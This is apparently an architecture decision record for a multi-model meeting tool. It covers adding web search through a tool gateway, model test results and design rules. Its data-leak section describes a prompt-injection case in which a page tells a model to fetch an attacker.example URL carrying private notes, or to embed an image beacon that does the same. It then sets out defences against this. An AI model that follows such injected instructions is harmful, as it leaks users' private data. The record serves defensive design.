# 0014: Tools through mcpgw; homestorm runs the loop

- **Status:** accepted, built 2026-11-05.
- **Date:** 2026-11-04, updated 2026-11-05

## Context

Every model behind llmgw answers only from its training data, so a seat can't check a price, a release date or
today's news. llmgw passes standard function tools through for Claude, GPT and DeepSeek (`tools`, `tool_calls`,
`role: "tool"` results), but it runs no tool and exposes no provider's built-in search.

A tool loop was tried against the real llmgw on 2026-11-04 with a fake MCP server offering one `web_search` that
returned a made-up gold price (`~/agentic/mcpgw/dev/tool-loop-demo/`):

- Claude Haiku 5.5, GPT-5.6 Luna and DeepSeek Flash each **chose** to search for "the current price of gold" and
  wrote their own query. None searched for "Who wrote Hamlet?".
- All three quoted the made-up price, so the answers came from the tool.
- They trusted it differently: Claude called the test feed implausible, DeepSeek said to cross-check, and GPT
  stated it as fact.

## Decision

**Tools come from mcpgw, the home cluster's tool gateway** (design: `~/agentic/mcpgw/docs/design.md`). llmgw stays
the model gateway; mcpgw runs tools (`web_search` through a self-hosted SearXNG, `web_fetch`, more later) over MCP.
homestorm calls it with `@modelcontextprotocol/client`, and converts tools to OpenAI format itself.

**homestorm runs the tool loop itself,** because when tools are used is meeting control:

1. **The date in the intro** (no mcpgw needed): "Today is …; your training data may be older." Models that know the
   date can tell when their knowledge may be stale.
2. **Chair search first.** A "Search the web" action: homestorm calls mcpgw's `web_search` and posts the results
   into the record as one "Sources" message. No model decides anything, and every seat reads the same sources, so
   blind rounds stay fair.
3. **Seat tools.** A seat setting: off, "Can search and read pages", or "Must search before answering". homestorm passes
   mcpgw's tools to llmgw for that seat only, runs each tool call on mcpgw, and returns the result, up to 4 calls per
   turn. Under the answer: "Searched: … · Read: …"; the sources enter the record.

**Three rules came out of testing with real models:**

- **"Must search" names the tool** (`tool_choice` with `web_search`), and only on the first step. llmgw refuses
  `"required"` for Claude models that think, because Anthropic won't force a tool on them unless it's named.
- **The forced final answer has no tool state.** When the calls are used up, the research goes in as plain text in a user
  message, with no `tools` and no tool messages. Keeping the tools and setting `tool_choice: "none"` failed: with thinking
  on, DeepSeek wrote its raw `<｜｜DSML｜｜tool_calls>` markup into the answer, and Claude Opus returned no text.
- **Text before a tool call isn't the answer.** "Let me check…" is dropped, and only what comes after is saved.

**Keeping data from leaking.** A page can tell a model to fetch `https://attacker.example/?data=<private notes>`. That's a
public address, so mcpgw's address checks allow it, and mcpgw can't tell where a URL came from. homestorm holds the
meeting, so it enforces this (mcpgw's ADR 0007):

- **A seat may only read links the Chair posted (in a message or the brief), or that `web_search` returned in this
  meeting.** Not links inside pages it read, and not addresses it knows or made up. A refusal never reaches mcpgw, goes
  back to the model as a tool error, and shows to the Chair.
- **Images in answers never load.** A model could write `![](https://attacker.example/?data=…)`, and the browser would send
  that with no click, getting around the rule above. They show as `[image: description]`.
- The intro tells seats that web text is data, not instructions.

## Alternatives considered

- **Provider built-in search** (Claude's `web_search` server tool, OpenAI's web search). Rejected: not reachable
  through llmgw, and it covers some families and not others, so seats wouldn't be comparable.
- **Tools inside llmgw.** Rejected in the mcpgw design: a slow or crashing tool, or a future code sandbox, must not
  share a process with the model logins every app depends on.
- **The tool loop inside mcpgw** (an agent service). Rejected: homestorm needs to decide which seats may use tools,
  how many calls a turn gets, and who sees the results.
- **Always search before answering** (search-first, as answer engines do). Covered by chair search when wanted;
  not the default, since most meeting questions don't need the web.

## Consequences

- homestorm depends on two gateways: llmgw for models, mcpgw for tools. Without mcpgw, the tool features are off
  and everything else works as now.
- Seat tools make turns slower and use more allowance; the per-turn call limit bounds both.
- In a blind round, seats that search may read different sources. Chair search avoids that.
- Some models repeat a weak source as fact, so the sources must always be visible to the chair.
- **Tested on all three families,** with thinking on: streaming `tool_calls`, several steps, naming a tool, and the forced
  final answer.
- A seat can't follow a link from a page it read unless the Chair posts it. That costs some research depth, and can be
  loosened per meeting later. In a real run, a page named without a link was refused, and searches didn't find it, so the
  seat said it couldn't read it and asked for the link.
- mcpgw being down doesn't fail a turn: the seat answers without tools, and isn't told it has them.
